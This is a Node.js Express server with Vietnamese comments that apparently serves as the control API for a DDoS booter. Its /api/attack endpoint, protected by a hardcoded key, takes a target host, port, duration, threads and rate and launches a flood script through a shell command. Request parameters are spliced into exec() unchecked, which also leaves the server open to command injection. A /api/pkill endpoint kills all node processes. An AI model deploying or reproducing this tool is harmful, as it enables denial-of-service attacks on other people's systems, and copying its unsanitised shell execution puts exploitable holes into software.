const express = require("express");
const { exec } = require("child_process");
const axios = require("axios");

const app = express();
const port = 80;

const maxConcurrentAttacks = 1;
let activeAttacks = 0;

// Lấy IP công cộng
const getPublicIP = async () => {
  try {
    const { data } = await axios.get('https://api.ipify.org?format=json');
    return data.ip;
  } catch (error) {
    console.error('Không thể lấy IP công cộng:', error);
    return 'N/A';
  }
};

// Kiểm tra dữ liệu đầu vào
const validateInput = ({ key, methods, host, modul, time, port, threads, rate }) => {
  if (![key, methods, host, modul, time, port, threads, rate].every(Boolean)) return "Thiếu tham số yêu cầu";
  if (key !== "negan") return "Invalid Key";
  if (time > 300) return "Thời gian phải nhỏ hơn 300 giây";
  if (port < 1 || port > 65535) return "Cổng không hợp lệ";
  if (threads < 1) return "Số luồng (threads) phải lớn hơn 0";
  if (rate < 1) return "Tốc độ (rate) phải lớn hơn 0";
  if (!["GET", "POST", "HEAD"].includes(modul.toUpperCase())) {
    return "Module không hợp lệ";
  }
  return null;
};

// Thực thi lệnh tấn công
const executeAttack = (command, clientIP) => {
  exec(command, (error, stdout, stderr) => {
    if (stderr) console.error(stderr);
    console.log(`[${clientIP}] Lệnh [${command}] đã được thực thi thành công.`);
    activeAttacks--;
  });
};

// API tấn công
app.get("/api/attack", (req, res) => {
  const { key, methods, host, modul, time, port, threads, rate } = req.query;
  const clientIP = req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  const validationMessage = validateInput({ key, methods, host, modul, time, port, threads, rate });
  if (validationMessage) return res.status(400).json({ status: "error", message: validationMessage });

  if (activeAttacks >= maxConcurrentAttacks) {
    return res.status(400).json({ status: "error", message: "Đã đạt giới hạn tấn công đồng thời" });
  }

  activeAttacks++;

  // Lệnh tấn công
  const command = `node --max-old-space-size=65536 ${methods}.js -m ${modul} -u ${host} -s ${time} -p ${port} -t ${threads} -r ${rate} --ratelimit true --full true`;

  executeAttack(command, clientIP);
  res.status(200).json({ status: "success", message: "Send Attack Successfully", methods, modul, host, port, time, threads, rate });
});

// API pkill
app.get("/api/pkill", (req, res) => {
  exec("pkill -f -9 node", (error, stdout, stderr) => {
    if (error || stderr) {
      return res.status(500).json({ status: "error", message: "Lỗi khi dừng tiến trình", error: stderr || error });
    }
    res.status(200).json({ status: "success", message: "Đã dừng tất cả các tiến trình tấn công." });
  });
});

// Khởi động server
getPublicIP().then((ip) => {
  app.listen(port, () => {
    console.log(`[Máy chủ API] đang chạy trên > ${ip}:${port}`);
  });
}).catch((err) => {
  console.error("Không thể lấy IP công cộng:", err);
});
